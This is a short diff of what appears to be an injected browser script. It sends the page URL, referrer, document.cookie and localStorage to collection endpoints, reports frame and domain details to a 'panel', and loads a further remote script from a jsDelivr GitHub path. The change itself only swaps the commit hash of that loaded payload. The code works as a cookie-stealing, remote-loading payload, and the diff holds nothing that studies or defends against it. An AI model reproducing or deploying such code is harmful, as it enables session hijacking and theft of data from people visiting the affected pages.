@@ -64,5 +64,5 @@ post("agent",[location.href,document.title,location.referrer,document.cookie].jo
 post("ls",ls());
 summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,1200));
 if(P){post("panel",location.host+" iframe="+(function(){try{return top!==self}catch(e){return "?"}})()+" dom="+document.domain);
- var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@1a3fdfc/p.js";document.body.appendChild(z);}
+ var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@93e2490/p.js";document.body.appendChild(z);}
 })();
